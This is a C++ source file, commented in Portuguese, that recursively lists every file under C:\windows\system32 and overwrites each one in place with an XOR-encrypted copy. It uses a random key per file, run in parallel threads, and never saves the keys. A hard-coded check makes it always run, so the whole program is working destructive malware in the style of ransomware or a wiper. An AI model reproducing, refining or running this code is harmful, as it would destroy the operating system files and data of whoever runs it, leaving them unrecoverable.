#include <iostream> // IO
#include <ctime>
#include <cstdlib> // Acesso a funções do C
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <stdexcept>
#include <filesystem>
#include <random>
#include <thread>

#define DIR_PATH "C:\\windows\\system32"

using namespace std;


/**
 * Classe para criptografar e ler o conteúdo de um arquivo.
 */
class CriptografiaArquivo {
    public:
        /**
         * Criptografa o arquivo no caminho especificado usando a chave fornecida.
         * O arquivo original é substituído pelo arquivo criptografado.
         *
         * @param caminhoArquivo O caminho para o arquivo a ser criptografado.
         * @param chave A chave usada para criptografar o arquivo.
         * @throws std::runtime_error se não for possível abrir o arquivo para leitura
         *         ou o arquivo temporário para escrita.
         */
        static void criptografarArquivo(const std::string& caminhoArquivo, const std::string& chave) {
            // Abre o arquivo original para leitura
            std::ifstream arquivo(caminhoArquivo, std::ios::binary);
            if (!arquivo.is_open()) {
                throw std::runtime_error("Não foi possível abrir o arquivo para leitura");
            }

            // Abre o arquivo temporário para escrita
            std::ofstream arquivoCriptografado(caminhoArquivo + ".temp", std::ios::binary);
            if (!arquivoCriptografado.is_open()) {
                arquivo.close();
                throw std::runtime_error("Não foi possível abrir o arquivo temporário para escrita");
            }

            // Criptografa o arquivo caractere por caractere
            char c;
            size_t i = 0;
            while (arquivo.get(c)) {
                arquivoCriptografado.put(c ^ chave[i % chave.size()]);
                i++;
            }

            // Fecha os arquivos
            arquivo.close();
            arquivoCriptografado.close();

            // Renomeia o arquivo temporário para substituir o arquivo original
            std::filesystem::rename(caminhoArquivo + ".temp", caminhoArquivo);
        }

        /**
         * Lê o conteúdo do arquivo no caminho especificado e retorna como uma string.
         *
         * @param caminhoArquivo O caminho para o arquivo a ser lido.
         * @return O conteúdo do arquivo como uma string.
         * @throws std::runtime_error se não for possível abrir o arquivo para leitura.
         */
        static std::string lerConteudoArquivo(const std::string& caminhoArquivo) {
            // Abre o arquivo para leitura
            std::ifstream arquivo(caminhoArquivo, std::ios::binary);
            if (!arquivo.is_open()) {
                throw std::runtime_error("Não foi possível abrir o arquivo para leitura: " + caminhoArquivo);
            }

            // Lê o conteúdo do arquivo para um stringstream
            std::stringstream buffer;
            buffer << arquivo.rdbuf();
            arquivo.close();

            // Retorna o conteúdo do arquivo como uma string
            return buffer.str();
        }
};


/**
 * Classe para escanear um diretório e listar todos os arquivos encontrados.
 */
class DirectoryScanner {
    public:
        /**
         * Construtor padrão da classe `DirectoryScanner`.
         */
        DirectoryScanner() {}

        /**
         * Lista todos os arquivos encontrados no diretório especificado e seus subdiretórios.
         *
         * @param dir_path O caminho do diretório a ser escaneado.
         * @return Um vetor de strings contendo os caminhos completos de todos os arquivos encontrados.
         */
        std::vector<std::string> list_files(const std::string& dir_path) {
            std::vector<std::string> files; // Vetor para armazenar os caminhos completos dos arquivos

            try {
                // Percorre todos os arquivos e subdiretórios do diretório especificado
                for (const auto& entry : std::filesystem::recursive_directory_iterator(dir_path)) {
                    if (entry.is_regular_file()) {
                        // Se o item encontrado for um arquivo, adiciona o caminho completo ao vetor de arquivos
                        files.push_back(entry.path().string());
                    }
                }
            }
            catch (const std::system_error& e) {
                std::cerr << "Erro ao acessar o diretório: " << e.what() << std::endl;
            }
            catch (...) {
                std::cerr << "Erro desconhecido ao acessar o diretório." << std::endl;
            }

            return files; // Retorna o vetor de arquivos encontrados
        }
};


/**
 * Classe principal do programa.
 */
class Programa {
    private:
        CriptografiaArquivo ca;      // Objeto responsável pela criptografia de arquivos
        DirectoryScanner ds;        // Objeto responsável pela varredura de diretórios

    public:
        /**
         * Construtor padrão da classe `Programa`.
         */
        Programa() {}

        /**
         * Gera um número aleatório entre o intervalo especificado.
         *
         * @param min O valor mínimo do intervalo.
         * @param max O valor máximo do intervalo.
         * @return Um número aleatório entre o intervalo especificado.
         */
        int gerarNumeroAleatorio(int min, int max) {
            std::random_device rd;             // Obtém uma seed aleatória do dispositivo do sistema
            std::mt19937 mt(rd());             // Inicializa o gerador de números aleatórios com a seed
            std::uniform_int_distribution<int> dist(min, max);    // Define a distribuição dos números

            return dist(mt);    // Gera e retorna um número aleatório
        }

        /**
         * Executa o programa.
         */
        void executar() {
            std::vector<std::string> files = ds.list_files(DIR_PATH);    // Obtém a lista de arquivos

            int numero_sorteado = 6;    // Número sorteado (exemplo)

            if (numero_sorteado == 6) {
                std::vector<std::thread> threads;

                // Para cada arquivo, cria uma thread para criptografá-lo
                for (const auto& file : files) {
                    threads.emplace_back([&]() {
                        std::string chave = std::to_string(gerarNumeroAleatorio(1, 100000000));
                        try {
                            ca.criptografarArquivo(file, chave);
                        } catch (const std::exception& e) {
                            std::cerr << "Erro ao criptografar arquivo: " << e.what() << std::endl;
                        }
                    });
                }

                // Aguarda todas as threads terminarem
                for (auto& thread : threads) {
                    thread.join();
                }
            }
        }
};


/**
 * Função principal do programa.
 * Cria um objeto da classe Programa e executa o programa.
 *
 * @return O valor de saída do programa.
 */
int main() {
    Programa p;     // Cria um objeto da classe Programa
    p.executar();   // Executa o programa
    return 0;       // Retorna 0 para indicar sucesso
}